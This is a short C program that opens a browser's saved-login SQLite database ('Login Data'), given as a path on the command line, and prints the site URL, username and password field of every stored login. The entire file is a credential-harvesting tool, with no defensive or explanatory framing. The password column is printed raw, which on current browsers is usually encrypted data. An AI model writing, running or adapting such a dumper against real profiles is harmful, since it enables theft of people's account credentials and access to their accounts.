#include <sqlite3.h>
#include <stdio.h>

int callback(void *NotUsed, int argc, char **argv,
                    char **azColName) {

    NotUsed = 0;

    for (int i = 0; i < argc; i++) {
        	printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
		}
    printf("\n");

    return 0;
}


int main(int argc, char *argv[]) {
	if( argc != 2 ) {
      printf("Please put the directory to Login Data\n ./prog /home/whatever/here");
	  return 1;
 	}

    sqlite3 *db;
    char *err_msg = 0;
    
    int rc = sqlite3_open(argv[1], &db);
    if (rc != SQLITE_OK) {
        
        fprintf(stderr, "Cannot open database: %s\n", 
                sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }
    
    char *sql = "SELECT action_url, username_value, password_value FROM logins";
 
    rc = sqlite3_exec(db, sql, callback, 0, &err_msg);
    
    if (rc != SQLITE_OK ) {        
        fprintf(stderr, "Failed to select data\n");
        fprintf(stderr, "Error: %s\n", err_msg);
        sqlite3_free(err_msg);
        sqlite3_close(db);
        return 1;
    } 
    
    sqlite3_close(db);
    
    return 0;
}

